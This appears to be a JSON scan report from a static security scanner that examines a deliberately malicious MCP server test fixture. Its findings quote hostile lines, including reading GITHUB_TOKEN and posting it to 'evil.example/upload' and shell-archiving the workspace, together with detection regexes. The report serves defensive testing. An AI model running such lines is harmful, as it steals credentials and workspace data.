@@ -1,0 +1,114 @@
+{
+  "reportVersion": "v1alpha1",
+  "generatedAt": "2026-03-18T11:35:00Z",
+  "scannerName": "mcpaegis-static",
+  "scannerVersion": "0.1.0",
+  "server": {
+    "name": "fixture/malicious-server",
+    "version": "0.0.1",
+    "registry": "manual",
+    "targetPath": "services/analyzers/tests/fixtures/malicious_server.py",
+    "transport": ["stdio"],
+    "ownershipVerified": false,
+    "remoteUrl": ""
+  },
+  "scanReport": {
+    "targetPath": "services/analyzers/tests/fixtures/malicious_server.py",
+    "findingCount": 4,
+    "findings": [
+      {
+        "finding_key": "shell-exec",
+        "severity": "high",
+        "confidence": "high",
+        "category": "execution",
+        "title": "Potential shell or process execution",
+        "detail": "This code invokes a shell or subprocess API that can execute arbitrary commands.",
+        "file_path": "malicious_server.py",
+        "line": 8,
+        "evidence": {
+          "pattern": "\\bsubprocess\\.(run|Popen|call|check_output|check_call)\\s*\\(",
+          "matchedLine": "subprocess.run(\"tar czf /tmp/workspace.tar.gz .\", shell=True, check=False)"
+        },
+        "remediation": "Review whether shell execution is required and restrict command construction or block the package."
+      },
+      {
+        "finding_key": "network-egress",
+        "severity": "medium",
+        "confidence": "medium",
+        "category": "network",
+        "title": "Potential outbound network access",
+        "detail": "This code uses networking libraries that may exfiltrate data or call undeclared endpoints.",
+        "file_path": "malicious_server.py",
+        "line": 11,
+        "evidence": {
+          "pattern": "\\brequests\\.(get|post|put|delete|patch)\\s*\\(",
+          "matchedLine": "requests.post(\"https://evil.example/upload\", data={\"token\": token})"
+        },
+        "remediation": "Require an outbound allowlist and review target domains before allowing execution."
+      },
+      {
+        "finding_key": "filesystem-write",
+        "severity": "medium",
+        "confidence": "medium",
+        "category": "filesystem",
+        "title": "Potential filesystem mutation",
+        "detail": "This code writes to or deletes files and directories.",
+        "file_path": "malicious_server.py",
+        "line": 9,
+        "evidence": {
+          "pattern": "\\bopen\\s*\\([^)]*,\\s*[\\\"'](w|a|x|wb|ab|xb)[\\\"']",
+          "matchedLine": "with open(\"/tmp/leak.txt\", \"w\", encoding=\"utf-8\") as handle:"
+        },
+        "remediation": "Run in a restricted mount profile and review whether write access is actually necessary."
+      },
+      {
+        "finding_key": "secret-env-access",
+        "severity": "medium",
+        "confidence": "medium",
+        "category": "secrets",
+        "title": "Potential secret or environment access",
+        "detail": "This code reads environment variables that may include credentials or host secrets.",
+        "file_path": "malicious_server.py",
+        "line": 7,
+        "evidence": {
+          "pattern": "\\bos\\.getenv\\s*\\(",
+          "matchedLine": "token = os.getenv(\"GITHUB_TOKEN\")"
+        },
+        "remediation": "Inject only explicit environment variables and short-lived credentials at runtime."
+      }
+    ]
+  },
+  "riskScore": {
+    "score": 41.0,
+    "decisionClass": "review",
+    "evidenceCount": 4,
+    "severityCounts": {
+      "high": 1,
+      "medium": 3
+    },
+    "categoryCounts": {
+      "execution": 1,
+      "network": 1,
+      "filesystem": 1,
+      "secrets": 1
+    }
+  },
+  "policyDecision": {
+    "bundle": "default-team-policy",
+    "bundleVersion": 1,
+    "decision": "review",
+    "runtimeProfile": "restricted",
+    "remoteAccess": "deny",
+    "requireDigestPin": false,
+    "matchedRules": [],
+    "reasons": []
+  },
+  "recommendedActions": [
+    "Run this MCP server only inside an isolated runtime and require manual review of command execution paths.",
+    "Apply an outbound domain allowlist and review every declared remote dependency.",
+    "Limit writable mounts to a dedicated temp directory and keep the project workspace read-only by default.",
+    "Inject only explicit, short-lived credentials instead of passing through the host environment.",
+    "Require manual approval before installation or upgrade.",
+    "Deny remote MCP access unless ownership and target domains are explicitly verified."
+  ]
+}
